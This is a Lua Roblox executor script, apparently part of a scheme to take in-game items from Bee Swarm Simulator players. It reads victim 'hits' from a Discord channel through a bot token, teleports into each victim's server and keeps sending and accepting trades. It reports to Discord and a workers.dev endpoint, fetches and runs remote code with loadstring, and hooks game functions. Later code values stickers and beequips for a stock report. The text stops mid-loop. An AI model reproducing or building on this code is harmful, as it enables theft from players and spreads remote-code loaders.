local AutoCollect = {
    GuildID = "1488497480185417779";
    ChannelID = "1503764937087127773";
    BotToken = _G.BotToken;
    ScanMessagesAmount = 8;
    BotInfoChannel = "1504112212287946772";
    StockChannel = "1504137215993708564";
}

local function SafeRequest(Data)
    local Suc, Res = pcall(function()
        return http.request(Data)
    end)
    if Suc then
        return Res
    else
        warn("[SafeRequest] Failed request: " .. tostring(Res))
        task.wait(3)
        return SafeRequest(Data)
    end
end

local function PublishMessage(ChannelID, Content)
    local Request = SafeRequest({
        Url = "https://discord.com/api/v9/channels/" .. ChannelID .. "/messages",
        Headers = {
            ["content-type"] = "application/json",
            authorization = "Bot " .. AutoCollect.BotToken
        },
        Method = "POST",
        Body = game:GetService("HttpService"):JSONEncode({
            content = Content
        })
    })
    if Request.StatusCode ~= 200 then
        warn("Failed to publish a message with PublishMessage: " .. tostring(Request.Body))
    end
end

local LocalPlayer = game:GetService("Players").LocalPlayer

local function NextTicketVoucher()
    return 86400 - (os.time() - game.ReplicatedStorage.Events.RetrievePlayerStats:InvokeServer().SystemTimes["RedeemedTicket Voucher"])
end

game:GetService("RunService").RenderStepped:Connect(function()
    local char = LocalPlayer.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if root then
        --root.CFrame = CFrame.new(170, 32, 587)
    end
end)

local function serverhop()
    local servers = {}
    local req = game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100&excludeFullGames=true")
    local body = game:GetService("HttpService"):JSONDecode(req)

    if body and body.data then
        for i, v in next, body.data do
            if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= game.JobId then
                table.insert(servers, 1, v.id)
            end
        end
    end

    if #servers > 0 then
        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], game:GetService("Players").LocalPlayer)
    else
        return warn("Couldn't find a server.")
    end
end

local IsServerFull = false
local LastJobIdToJoin = nil
local IgnoreServer = {}
game:GetService("GuiService").ErrorMessageChanged:Connect(function(message)
    local text = game:GetService("CoreGui"):WaitForChild("RobloxPromptGui"):WaitForChild("promptOverlay"):WaitForChild("ErrorPrompt"):WaitForChild("MessageArea"):WaitForChild("ErrorFrame"):WaitForChild("ErrorMessage").Text
    warn(text)
    if text:lower():find("disconnect") or text:lower():find("kick") then
        PublishMessage(AutoCollect.BotInfoChannel, "Account was kicked. message: ```" .. text .. "```")
        while task.wait() do
            serverhop()
        end
    elseif text:lower():find("server is full") then
        IsServerFull = true
    elseif text:lower():find("restricted") and LastJobIdToJoin then  
        IgnoreServer[LastJobIdToJoin] = true
    end
end)

queue_on_teleport((_G.loadatlasautojoin and "_G.loadatlasautojoin=true; " or "") .. "_G.BotToken = \"" .. AutoCollect.BotToken .. '\"; loadstring(game:HttpGet("https://raw.githubusercontent.com/exodus892/__exodus__/refs/heads/main/NextgenAutocollect.lua"))()')

LocalPlayer.Idled:Connect(function()
    game:GetService("VirtualUser"):CaptureController()
    game:GetService("VirtualUser"):ClickButton2(Vector2.new())
end)

local Scans = 0
local Gui = Instance.new("ScreenGui", gethui())
Gui.ResetOnSpawn = false
local Label = Instance.new("TextLabel", Gui)
Label.Size = UDim2.fromOffset(100, 40)
Label.TextScaled = true
Label.Position = UDim2.new(1, -99, 0, 20)
Label.Text = "Waiting .."
Label.AnchorPoint = Vector2.new(1, 0)
Label.BackgroundColor3 = Color3.fromRGB(24, 24, 27)
Label.BackgroundTransparency = 0.5
Label.TextColor3 = Color3.fromRGB(255, 255, 255)

local ntv = Label:Clone()
ntv.Parent = Gui
ntv.Position = UDim2.new(1, -99, 0, 64)
ntv.BackgroundColor3 = Color3.fromRGB(255, 136, 0)

local redeemticketvoucher = function()
    
end

local function formatTimer(unix)
    local d = math.floor(unix / 86400)
    local h = math.floor(unix % 86400 / 3600)
    local m = math.floor(unix % 3600 / 60)
    local s = unix % 60

    return string.format("%d:%02d:%02d:%02d", d, h, m, s)
end

task.spawn(function()
    while true do
        if NextTicketVoucher() > 0 then
            ntv.Text = "Next ticket voucher: " .. formatTimer(NextTicketVoucher())
        else
            ntv.Text = "Ticket Voucher ready"
            redeemticketvoucher()
        end
        task.wait(0.1)
    end
end)

Instance.new("UICorner", ntv).CornerRadius = UDim.new(0, 7)
ntv.UICorner:Clone().Parent = Label

local Events = game:GetService("ReplicatedStorage"):WaitForChild("Events")
local TradeGui = require(game:GetService("ReplicatedStorage"):WaitForChild("Gui"):WaitForChild("TradeGui"))
local SessionID
require(Events).ClientListen("TradeUpdateInfo", function(IncomingData)
    SessionID = IncomingData.SessionID
end)
local Victim
repeat task.wait() until LocalPlayer:FindFirstChild("PlayerGui") and
    LocalPlayer.PlayerGui:FindFirstChild("LoadingScreenGui") and
    LocalPlayer.PlayerGui.LoadingScreenGui:FindFirstChild("LoadingMessage") and
    LocalPlayer.PlayerGui.LoadingScreenGui.LoadingMessage.Visible == false
local ScrGui = LocalPlayer.PlayerGui:WaitForChild("ScreenGui")

local function GetMessages(ChannelID, Limit)
    local Request = SafeRequest({
        Url = "https://discord.com/api/v9/channels/" .. (ChannelID or AutoCollect.ChannelID) .. "/messages?limit=" .. (Limit or tostring(AutoCollect.ScanMessagesAmount)),
        Headers = {
            ["content-type"] = "application/json",
            authorization = "Bot " .. AutoCollect.BotToken
        },
        Method = "GET"
    })
    if Request.StatusCode == 200 then
        return game:GetService("HttpService"):JSONDecode(Request.Body)
    end
end

local function PublishMessage(ChannelID, Content, CustomBody)
    local Request = SafeRequest({
        Url = "https://discord.com/api/v9/channels/" .. ChannelID .. "/messages",
        Headers = {
            ["content-type"] = "application/json",
            authorization = "Bot " .. AutoCollect.BotToken
        },
        Method = "POST",
        Body = game:GetService("HttpService"):JSONEncode(CustomBody or {
            content = Content
        })
    })
    if Request.StatusCode ~= 200 then
        warn("Failed to publish a message with PublishMessage: " .. tostring(Request.Body))
    end
    return Request
end

task.spawn(function ()
    local interval = 900
    local elapsed = 0

    while true do
        task.wait(interval)
        interval = math.random(600, 1200)
        elapsed = elapsed + 10

        local msg = "Auto-Join is still running after " .. elapsed .. " minutes. There have not been any hits to take."
        --PublishMessage(AutoCollect.BotInfoChannel, msg)
    end
end)

local function SetMarked(id)
    local Content = isfile("ExodusJoined") and readfile("ExodusJoined") or "{}"
    local Before = game:GetService("HttpService"):JSONDecode(Content)
    local Clone = table.clone(Before)
    table.insert(Clone, 1, id)
    local NewTable = {}
    for i, v in pairs(Clone) do
        if i <= (AutoCollect.ScanMessagesAmount) then
            NewTable[i] = v
        end
    end
    writefile("ExodusJoined", game:GetService("HttpService"):JSONEncode(NewTable))
end

local function IsMarked(id)
    local Content = isfile("ExodusJoined") and readfile("ExodusJoined") or "{}"
    local Marked = game:GetService("HttpService"):JSONDecode(Content)
    return table.find(Marked, id) ~= nil
end

local HttpService = game:GetService("HttpService")

local function getMsgTime(msg)
    local year, month, day, hour, min, sec =
                msg.timestamp:match("(%d+)%-(%d+)%-(%d+)T(%d+):(%d+):(%d+)")

            local msgTime = os.time({
                year = tonumber(year),
                month = tonumber(month),
                day = tonumber(day),
                hour = tonumber(hour),
                min = tonumber(min),
                sec = tonumber(sec)
            })

        return msgTime
end

local function Scan(Tp, Json)
    local Messages = GetMessages()
    if Messages then
        for i, msg in pairs(Messages) do
            local Suc,Res=pcall(function()
                local msgTime = getMsgTime(msg)
                if os.time() - msgTime <= 1800 then
                    local content = msg.content
                    if content:find("Private Server") or content:find("Connection Lost") then return end
                    local embed = msg.embeds[1]
                    if embed.color ~= 0xe4f527 and Tp then return end
                    if Tp == false and embed.color ~= 0x00ff04 then
                        return
                    end

                    local AutjoinData = {
                        jobid = content:match("&launchData=%d+/(.+)%)"),
                        placeid = tonumber(content:match("&launchData=(%d+)/")),
                        userid = embed.footer.text:match("User Id: (.+)"),
                        completed = content:find("Completed"),
                        saturated = content:find("Completed") or content:find("Progress")
                    }
                    if AutjoinData.userid == tostring(LocalPlayer.UserId) then return end
                    local AJdata = AutjoinData
                    if Tp and not IsMarked(msg.id) and AJdata.saturated == nil then
                        writefile("ExodusAutojoin", HttpService:JSONEncode(AutjoinData))
                        SetMarked(msg.id)
                        task.spawn(function()
                            PublishMessage(AutoCollect.BotInfoChannel, `Auto-Join is checking this https://discord.com/channels/{AutoCollect.GuildID}/{AutoCollect.ChannelID}/{msg.id} (User ID: {AJdata.userid})`)
                        end)
                        repeat
                            LastJobIdToJoin = AJdata.jobid
                            game:GetService("TeleportService"):TeleportToPlaceInstance(AutjoinData.placeid, AJdata.jobid, LocalPlayer)
                            if IgnoreServer[LastJobIdToJoin] then
                                PublishMessage(AutoCollect.BotInfoChannel, "The place is restricted and the bot can't join, for some reason")
                                break
                            end
                            if IsServerFull then
                                task.wait(10)
                                IsServerFull = false
                            else
                                task.wait(2)
                            end
                        until nil
                    elseif Tp == false then
                        if AJdata.completed and Json.jobid == game.JobId and Victim and tonumber(Json.userid) == Victim.UserId then
                            return true
                        end
                    end
                end
            end)
            if Suc and type(Res) == "boolean" then
                return Res
            else
                return false
            end
        end
    end
end

local function FindVictim(Json)
    if not Json or game.JobId ~= Json.jobid then
        if game.JobId ~= Json.jobid then
            PublishMessage(AutoCollect.BotInfoChannel, "(v7.1) Auto-Join started running on " .. LocalPlayer.Name)
        end
        return
    end
    for i, v in pairs(LocalPlayer.Parent:GetPlayers()) do
        if v.UserId == tonumber(Json.userid) then
            Victim = v
            break
        end
    end
end

local function Accept()
    pcall(function()
        if ScrGui.TradeLayer.TradeAnchorFrame.TradeFrame.ButtonAccept.ButtonTop.TextLabel.Text ~= "Unaccept" then
            require(Events).ClientCall("TradePlayerAccept", SessionID, {
                [tostring(LocalPlayer.UserId)] = TradeGui.GetMyOffer(),
                [tostring(Victim.UserId)] = TradeGui.GetTheirOffer()
            })
        end
    end)
end

local IsStealing = true
local Completed
local Json
LocalPlayer.Parent.PlayerRemoving:Connect(function(v)
    if v == Victim then
        if not Completed then
            task.spawn(function()
                PublishMessage(AutoCollect.BotInfoChannel, "The victim left")
            end)
        end
        Victim = nil
        IsStealing = false
    end
end)
local TimeWithoutTrade = 0
local asdadsa = tick()
task.spawn(function()
    while task.wait() do
        if IsStealing and Victim then
            local Gui = ScrGui.TradeLayer:FindFirstChild("TradeAnchorFrame") and ScrGui.TradeLayer:FindFirstChild("TradeAnchorFrame"):FindFirstChild("TradeFrame")
            if Gui then
                asdadsa = tick()
            end
            if TimeWithoutTrade >= 25 then
                PublishMessage(AutoCollect.BotInfoChannel, "Even though the the player was in the server, no trade was recieved in 25 seconds therefore the auto join will ignore this hit.")
                IsStealing = false
            end
        end
        TimeWithoutTrade = tick() - asdadsa
    end
end)
task.spawn(function()
    repeat task.wait() until Victim
    while IsStealing and task.wait(1) do
        local IsComplete = Scan(false, Json)
        if IsComplete then
            IsStealing = false
            Completed = true
            return warn("Found completion marker")
        end
    end
end)
LocalPlayer.TradeConfig.IsTrading:GetPropertyChangedSignal("Value"):Connect(function()
    if LocalPlayer.TradeConfig.IsTrading.Value then
        repeat task.wait() until not LocalPlayer.TradeConfig.IsTrading.Value
        if not Victim then return end
        SafeRequest({
            Url = "https://testbss.chieokure.workers.dev/finished",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json",
            },
            Body = HttpService:JSONEncode({
                userid = Victim.UserId
            })
        })
    end
end)
if isfile("ExodusAutojoin") then
    Json = game:GetService("HttpService"):JSONDecode(readfile("ExodusAutojoin"))
    FindVictim(Json)
    if Victim then
        local Name = Victim.Name
        while IsStealing and LocalPlayer.Parent:FindFirstChild(Name) and not Completed do
            Label.Text = "Sending trade"
            Events:WaitForChild("TradePlayerRequestStart"):FireServer(Victim.UserId)
            if Victim["TradeConfig"]["IsTrading"].Value then
                Label.Text = "Accepting"
                task.wait(6.5)
                Accept()
            end
            task.wait(1)
        end
    else
        if game.JobId == Json.jobid then
            task.spawn(function()
                PublishMessage(AutoCollect.BotInfoChannel, "The victim wasnt in the server")
            end)
        end
        warn("No victim")
        IsStealing = false
    end
else
    warn("No auto-join file")
    PublishMessage(AutoCollect.BotInfoChannel, "(v7.1) Auto-Join started running on " .. LocalPlayer.Name)
    IsStealing = false
end

--task.spawn(function()
local function await(object, ...)
    local Result = object
    local Paths = {...}

    for i = 1, #Paths do
        Result = Result:WaitForChild(Paths[i], math.huge)
    end

    return Result
end
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StatModifiers = require(await(ReplicatedStorage, "StatModifiers"))
local BeeStatMods = require(await(ReplicatedStorage, "BeeStats", "BeeStatMods"))
local CaseEntry = require(await(ReplicatedStorage, "Beequips", "BeequipCaseEntry"))
local BeequipFile = require(await(ReplicatedStorage, "Beequips", "BeequipFile"))

local function GetBQStatsString(File, Name)
    local Suc, Res = pcall(function()
        local BaseStats, HiveBonuses, Abilities = File:GenerateModifiers()
        local Potential = File.Q * 5
        local NumWaxes = (File:GetWaxHistory() and #File:GetWaxHistory()) or 0
        local Strings = {
            Base = '',
            Hivebonus = '',
            Ability = ''
        }
        if BaseStats then
            local Lines = {}
            for i, v in ipairs(BaseStats) do
                local StatStr, Success = BeeStatMods.GetType(v.Stat).Desc(v)
                if Success then
                    table.insert(Lines, StatStr)
                end
            end
            Strings.Base = table.concat(Lines, "\n")
        end
        if HiveBonuses then
            local Lines = {}
            for i, v in ipairs(HiveBonuses) do
                local StatStr = StatModifiers.Description(v)
                if StatStr then
                    table.insert(Lines, StatStr)
                end
            end
            Strings.Hivebonus = table.concat(Lines, "\n")
        end
        if Abilities then
            local Lines = {}
            for i, v in ipairs(Abilities) do
                local Ability = v[1]
                if Ability then
                    table.insert(Lines, Ability .. (v[2] and " (from wax)" or ''))
                end
            end
            Strings.Ability = table.concat(Lines, "\n")
        end

        local Stats = {}

        local function Concat(...)
            for i, v in pairs({...}) do -- Fixed, changed to pairs!
                if typeof(v) == "string" then
                    table.insert(Stats, v)
                end
            end
            return nil
        end

        if Name == "Bead Lizard" then
            local TokenLink = Strings.Ability:match("Token Link")
            local BeeAbilityPollen = Strings.Hivebonus:match("%+(%d+)%% Bee Ability Pollen")
            if BeeAbilityPollen == nil and TokenLink == nil then
                return
            end
            Concat(TokenLink and "Ability: Token Link", BeeAbilityPollen and BeeAbilityPollen .. "% Bee Ability Pollen")

        elseif Name == "Camphor Lip Balm" then
            local BubblePollen = Strings.Hivebonus:match("%+(%d+)%% Bubble Pollen")
            local GoldBubblePollen = Strings.Hivebonus:match("%+(%d+)%% Gold Bubble Pollen")
            local PepperPollen = Strings.Hivebonus:match("x(%d+%.%d+) Pepper Patch Pollen")
            if tonumber(PepperPollen) < 1.07 and tonumber(BubblePollen) < 18 then
                if GoldBubblePollen then
                    local GBP = tonumber(GoldBubblePollen)
                    if GBP >= 6 then
                    elseif GBP == 5 then
                    elseif GBP == 4 then
                        if tonumber(BubblePollen) < 14 then return end
                    elseif GBP == 3 then
                        if tonumber(BubblePollen) < 15 then return end
                    elseif GBP == 2 then
                        if tonumber(BubblePollen) < 16 then return end
                    else
                        return
                    end
                else
                    return
                end
            end
            Concat(BubblePollen .. "% Bubble Pollen", GoldBubblePollen and GoldBubblePollen .. "% Gold Bubble Pollen", "x" .. PepperPollen .. " Pepper Patch Pollen")

        elseif Name == "Candy Ring" then
            local HoneyAtHive = Strings.Hivebonus:match("%+(%d+)%% Honey At Hive")
            if tonumber(HoneyAtHive) < 9 then
                return
            end
            Concat(HoneyAtHive .. "% Honey At Hive")

        elseif Name == "Charm Bracelet" then
            local AbilityRate = Strings.Base:match("%+(%d+)%% Ability Rate")
            local HoneyAtHive = Strings.Hivebonus:match("%+(%d+)%% Honey At Hive")
            local Melody = Strings.Ability:match("Melody")
            if not Melody then
                return
            end
            Concat(AbilityRate .. "% Ability Rate", HoneyAtHive and HoneyAtHive .. "% Honey At Hive", Melody and "Ability: Melody")

        elseif Name == "Kazoo" then
            local CPHB = Strings.Hivebonus:match("%+(%d+)%% Critical Power")
            local SCPHB = Strings.Hivebonus:match("%+(%d+)%% Super%-Crit Power")
            if CPHB == nil and SCPHB == nil then
                return
            end
            if CPHB then
                if NumWaxes == 0 and Potential >= 4 and tonumber(CPHB) >= 4 then
                else
                    if tonumber(CPHB) < 6 and not SCPHB then return end
                    if SCPHB then
                        if tonumber(SCPHB) == 1 and tonumber(CPHB) < 3 then return end -- Anything else above 2 scp + any crp is good
                    end
                end
            else
                if tonumber(SCPHB) < 2 then return end
            end
            Concat(CPHB and CPHB .. "% Critical Power", SCPHB and SCPHB .. "% Super-Crit Power")

        elseif Name == "Paperclip" then
            local TokenLink = Strings.Ability:match("Token Link")
            local BeeAbilityPollen = Strings.Hivebonus:match("%+(%d+)%% Bee Ability Pollen")
            local AbilityTokenLifespan = Strings.Hivebonus:match("%+(%d+)%% Ability Token Lifespan")
            if BeeAbilityPollen == nil and TokenLink == nil and AbilityTokenLifespan == nil then
                return
            end
            if BeeAbilityPollen == nil and TokenLink == nil then
                if tonumber(AbilityTokenLifespan) < 7 then
                    return
                end
            end
            if BeeAbilityPollen and tonumber(BeeAbilityPollen) < 3 then
                if TokenLink == nil then return end
                if not TokenLink then
                    if not AbilityTokenLifespan or tonumber(AbilityTokenLifespan) < 7 then return end
                end
            end
            Concat(TokenLink and "Ability: Token Link", BeeAbilityPollen and BeeAbilityPollen .. "% Bee Ability Pollen", AbilityTokenLifespan and AbilityTokenLifespan .. "% Ability Token Lifespan")

        elseif Name == "Pink Shades" then
            local Focus = Strings.Ability:match("Focus")
            local SuperCritPower = Strings.Hivebonus:match("%+(%d+)%% Super%-Crit Power")
            local SuperCritChance = Strings.Hivebonus:match("%+(%d+)%% Super%-Crit Chance")
            if SuperCritPower == nil and SuperCritChance == nil then
                return
            end
            if SuperCritPower then
                if tonumber(SuperCritPower) < 7 then
                    if not SuperCritChance then return end
                    if tonumber(SuperCritPower) < 3 then return end
                end
            else
                return
            end
            Concat(Focus and "Ability: Focus", SuperCritPower and SuperCritPower .. "% Super-Crit Power", SuperCritChance and SuperCritChance .. "% Super-Crit Chance")

        elseif Name == "Smiley Sticker" then
            local HoneyMark = Strings.Ability:match("Honey Mark")
            local MarkDuration = Strings.Base:match("%+(%d+)%% Mark Duration")
            local MarkDurationHB = Strings.Hivebonus:match("%+(%d+)%% Mark Duration")
            if HoneyMark == nil then
                return
            end
            Concat(HoneyMark and "Ability: Honey Mark", MarkDuration .. "% Mark Duration", MarkDurationHB and ("{HB} " .. MarkDurationHB .. "% Mark Duration"))

        elseif Name == "Sweatband" then
            local RedGatherAmount = Strings.Base:match("%+(%d+)%% Red Gather Amount")
            local WhiteGatherAmount = Strings.Base:match("%+(%d+)%% White Gather Amount")
            local RedPollen = Strings.Hivebonus:match("%+(%d+)%% Red Pollen")
            local WhitePollen = Strings.Hivebonus:match("%+(%d+)%% White Pollen")
            RedPollen = RedPollen and tonumber(RedPollen) or 0
            WhitePollen = WhitePollen and tonumber(WhitePollen) or 0
            if (RedGatherAmount == nil and WhiteGatherAmount == nil) or ((not RedGatherAmount or tonumber(RedGatherAmount) < (27 - RedPollen)) and (not WhiteGatherAmount or tonumber(WhiteGatherAmount) < (29 - WhitePollen))) then
                return
            end
            Concat(
                RedGatherAmount and RedGatherAmount .. "% Red Gather Amount", WhiteGatherAmount and WhiteGatherAmount .. "% White Gather Amount",
                RedPollen and RedPollen .. "% Red Pollen", WhitePollen and WhitePollen .. "% White Pollen"
            )

        elseif Name == "Whistle" then
            local Melody = Strings.Ability:match("Melody")
            local SuperCritPower = Strings.Hivebonus:match("%+(%d+)%% Super%-Crit Power")
            if Melody == nil and (not SuperCritPower or tonumber(SuperCritPower) < 4) then 
                return
            end
            Concat(Melody and "Ability: Melody", SuperCritPower and SuperCritPower .. "% Super-Crit Power")

        elseif Name == "Elf Cap" then
            local HoneyAtHive = Strings.Hivebonus:match("%+(%d+)%% Honey At Hive")
            if HoneyAtHive == nil then
                return
            end
            if tonumber(HoneyAtHive) < 5 then
                if NumWaxes == 1 then
                    if tonumber(HoneyAtHive) < 3 then
                        return
                    end
                elseif NumWaxes == 2 then
                    if tonumber(HoneyAtHive) < 3 then
                        return
                    end
                elseif NumWaxes == 3 then
                    if tonumber(HoneyAtHive) ~= 4 then
                        return
                    end
                else
                    return
                end
            end
            Concat(HoneyAtHive .. "% Honey At Hive")

        elseif Name == "Festive Wreath" then
            local HoneyAtHive = Strings.Hivebonus:match("%+(%d+)%% Honey At Hive")
            if not HoneyAtHive or tonumber(HoneyAtHive) < 2 then
                return
            end
            Concat(HoneyAtHive .. "% Honey At Hive")

        elseif Name == "Paper Angel" then
            local BeeAbilityPollen = Strings.Hivebonus:match("%+(%d+)%% Bee Ability Pollen")
            local AbilityTokenLifespan = Strings.Hivebonus:match("%+(%d+)%% Ability Token Lifespan")
            if BeeAbilityPollen == nil or tonumber(BeeAbilityPollen) < 2 then
                if AbilityTokenLifespan == nil or tonumber(AbilityTokenLifespan) < 3 then
                    return
                end
            end
            Concat(BeeAbilityPollen and BeeAbilityPollen .. "% Bee Ability Pollen", AbilityTokenLifespan and AbilityTokenLifespan .. "% Ability Token Lifespan")

        elseif Name == "Pinecone" then
            local PinetreeCapacity = Strings.Hivebonus:match("%+(%d+)%% Pine Tree Forest Capacity")
            local PinetreePollen = Strings.Hivebonus:match("%+(%d+)%% Pine Tree Forest Pollen")
            local PTC = tonumber(PinetreeCapacity)
            local PTP = tonumber(PinetreePollen)
            if PTC < 14 then return end
            if PTC == 14 or PTC == 15 then
                return
            elseif PTC == 16 then
                if PTP < 12 then return end
            elseif PTC == 17 then
                if PTP < 9 then return end
            elseif PTC >= 18 then
            end
            Concat(PinetreeCapacity .. "% Pinetree Capacity", PinetreePollen .. "% Pinetree Pollen")

        elseif Name == "Poinsettia" then
            local RedPollen = Strings.Hivebonus:match("%+(%d+)%% Red Pollen")
            local BeeGatherPollen = Strings.Hivebonus:match("%+(%d+)%% Bee Gather Pollen")
            if RedPollen == nil and BeeGatherPollen == nil and not (NumWaxes == 0 and Potential >= 4.5) then
                return
            end
            if (not BeeGatherPollen or tonumber(BeeGatherPollen) < 12) then
                local LimitRp = 7
                if BeeGatherPollen and tonumber(BeeGatherPollen) >= 10 then
                    LimitRp = 5
                end
                if RedPollen and tonumber(RedPollen) >= LimitRp then
                else
                    return
                end
            end
            Concat(RedPollen and RedPollen .. "% Red Pollen", BeeGatherPollen and BeeGatherPollen .. "% Bee Gather Pollen")

        elseif Name == "Reindeer Antlers" then
            local BondFromTreats = Strings.Hivebonus:match("%+(%d+)%% Bond From Treats")
            local Capacity = Strings.Hivebonus:match("%+(%d+)%% Capacity")
            local BabyLove = Strings.Ability:match("Baby Love")
            if BondFromTreats == nil and Capacity == nil and BabyLove == nil then
                return
            end
            if BondFromTreats == nil and BabyLove == nil then
                if tonumber(Capacity) < 4 then
                    return
                end
            end
            Concat(BondFromTreats and BondFromTreats .. "% Bond From Treats", Capacity and Capacity .. "% Capacity", BabyLove and "Ability: Baby Love")

        elseif Name == "Snow Tiara" then
            local BlueFieldCapacity = Strings.Hivebonus:match("^%+([%d%.]+)%% Blue Field Capacity")
            if tonumber(BlueFieldCapacity) < 6 then
                return
            end
            Concat(BlueFieldCapacity .. "% Blue Field Capacity")

        elseif Name == "Toy Drum" then
            local BeeAbilityPollen = Strings.Hivebonus:match("%+(%d+)%% Bee Ability Pollen")
            if BeeAbilityPollen == nil and not (NumWaxes == 0 and Potential >= 4.5) then
                return
            end
            if not (NumWaxes == 0 and Potential >= 4.5) then
                if not BeeAbilityPollen or tonumber(BeeAbilityPollen) < 4 then
                    return
                end
            end
            Concat(BeeAbilityPollen and BeeAbilityPollen .. "% Bee Ability Pollen")

        elseif Name == "Toy Horn" then
            local BeeAbilityPollen = Strings.Hivebonus:match("%+(%d+)%% Bee Ability Pollen")
            --if not (NumWaxes == 0 and Potential >= 4.5) then
                if not BeeAbilityPollen or tonumber(BeeAbilityPollen) < 2 then
                    return
                end
            --end
            Concat(BeeAbilityPollen and BeeAbilityPollen .. "% Bee Ability Pollen")
        else
            return
        end

        return #Stats > 0 and table.concat(Stats, "\n") or "No Stats"
    end)
    if not Suc then
        return "An error occured filtering stats: " .. tostring(Res)
    else
        return Res
    end
end

local function GetPlayerStats()
    return require(await(ReplicatedStorage, "ClientStatCache")):Get()
end

local function GetTypeDef(File)
    local Success, Result = pcall(function()
        return CaseEntry.FromData(File):FetchBeequip(GetPlayerStats(), false)
    end)
    if Success and Result then
        return Result
    end
    Success, Result = pcall(function()
        return BeequipFile.FromData(File)
    end)
    if Success and Result then
        return Result
    end
    return nil
end

local function GetStickers()
    local PlayerStats = GetPlayerStats()
    local Stickers = PlayerStats.Stickers
    local Book = Stickers and Stickers.Book
    local Inbox = Stickers and Stickers.Inbox
    
    if not Book then
        warn("No sticker book!")
        return nil
    end

    local ReturnedStickers = {}

    for _, File in ipairs(Book) do
        if File:GetTypeDef() then
            table.insert(ReturnedStickers, {F=File,L="Case"})
        end
    end

    for _, File in ipairs(Inbox) do
        if File:GetTypeDef() then
            table.insert(ReturnedStickers, {F=File,L="Inbox"})
        end
    end

    return ReturnedStickers
end

redeemticketvoucher = function()
    --PublishMessage(AutoCollect.BotInfoChannel, "<:Ticket_Voucher:1504592174614970488> Attempting to redeem ticket voucher")
    for i, v in pairs(GetStickers()) do
        pcall(function()
            local name = v.F:GetTypeDef().Name
            if name == "Ticket Voucher" then
                warn("redeeming ticket voucher")
                local args = {
                    v.F,
                    true
                }
                game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("StickerRedeemVoucher"):FireServer(unpack(args))
            end
        end)
    end
    task.wait(3)
end
local OldPush
local AlertBoxes = require(await(ReplicatedStorage, "AlertBoxes"))
OldPush = hookfunction(AlertBoxes.Push, newcclosure(function(self, Text, ...)
    if Text == "+100 Tickets (from Ticket Voucher)" then
        task.spawn(function()
            task.wait(5)
            PublishMessage(AutoCollect.BotInfoChannel, "<:Ticket_Voucher:1504592174614970488> Redeemed ticket voucher. Next: <t:" .. (math.floor(os.time() + NextTicketVoucher())) .. ":R>")
        end)
    end
    return OldPush(self, Text, ...)
end))

local function GetBeequips()
    local PlayerStats = GetPlayerStats()
    local Beequips = PlayerStats.Beequips
    local Case = Beequips and Beequips.Case or {}
    local Storage = Beequips and Beequips.Storage or {}
    local Inbox = Beequips and Beequips.Inbox or {}

    local ReturnedBeequips = {}

    pcall(function()
        for _, File in ipairs(Case) do
            local TypeDef = GetTypeDef(File)
            if TypeDef then
                local StatString = GetBQStatsString(TypeDef, TypeDef:GetTypeDef().DisplayName)
                if (#{StatString}) > 0 then
                    table.insert(ReturnedBeequips, {F=File,L="Case"})
                end
            end
        end
    end)

    pcall(function()
        for _, File in ipairs(Storage) do
            local TypeDef = GetTypeDef(File)
            if TypeDef then
                local StatString = GetBQStatsString(File, TypeDef:GetTypeDef().DisplayName)
                if (#{StatString}) > 0 then
                    table.insert(ReturnedBeequips, {F=File,L="Storage"})
                end
            end
        end
    end)

    pcall(function()
        for _, File in ipairs(Inbox) do
            local TypeDef = GetTypeDef(File)
            if TypeDef then
                local StatString = GetBQStatsString(File, TypeDef:GetTypeDef().DisplayName)
                if (#{StatString}) > 0 then
                    table.insert(ReturnedBeequips, {F=File,L="Inbox"})
                end
            end
        end
    end)

    return ReturnedBeequips
end

local function Collapse(list)
    local Counts = {}
    local Order = {}

    for _, v in ipairs(list) do
        if Counts[v] then
            Counts[v] += 1
        else
            Counts[v] = 1
            table.insert(Order, v)
        end
    end

    local result = {}

    for _, v in ipairs(Order) do
        local n = Counts[v]
        if n > 1 then
            table.insert(result, "x" .. n .. " " .. v)
        else
            table.insert(result, v)
        end
    end

    return result
end

local function SortByHierarchy(List, Hierarchy)
    local function GetRank(Item)
        Item = string.lower(Item)

        for Index, Keyword in ipairs(Hierarchy) do
            if string.find(Item, string.lower(Keyword), 1, true) then
                return Index
            end
        end

        return math.huge
    end

    table.sort(List, function(A, B)
        local RankA = GetRank(A)
        local RankB = GetRank(B)

        if RankA == RankB then
            return A < B
        end

        return RankA < RankB
    end)

    return List
end

local Stickers = GetStickers()
local Beequips = GetBeequips()

local StickerNames = {}
local Hierachy = {
    "Cub Skin",
    "Voucher",
    "Hive Skin",
    "Star Sign",
    "Stamp",
    "Fleuron",
    "Painting"
}

for _, Sticker in ipairs(Stickers) do
    local Name = Sticker.F:GetTypeDef().Name:gsub("x2 Convert Speed Voucher", 'CSV'):gsub("x2 Bee Gather Voucher", 'BGV')
        :gsub("Bear Bee Voucher", 'BBV'):gsub("Offline Voucher", 'OFV'):gsub("Ticket Voucher", 'TV')
        :gsub("Cub Buddy Voucher", 'CBV')
    table.insert(StickerNames, Name .. " : " .. Sticker.L)
end

local SortedStickers = Collapse(SortByHierarchy(StickerNames, Hierachy))
local InboxStickerTable = {}
local CaseStickerTable = {}

for i, v in pairs(SortedStickers) do
    if v:find(" : Inbox") then
        table.insert(InboxStickerTable, (v:gsub(" : Inbox", "")))
    else
        table.insert(CaseStickerTable, (v:gsub(" : Case", "")))
    end
end

local Description = "**Stickers**\n----Case Stickers----\n"
Description = Description .. table.concat(CaseStickerTable, "\n") .. (#InboxStickerTable > 0 and "\n----Inbox Stickers----\n" or "") .. table.concat(InboxStickerTable, "\n") .. "\n\n**Beequips**\n"


for i, bq in pairs(Beequips) do
    local f = bq.F
    local loc = bq.L
    local TypeDef = GetTypeDef(f)
    local Goods = GetBQStatsString(TypeDef, TypeDef:GetTypeDef().DisplayName)
    local name = TypeDef:GetTypeDef().DisplayName
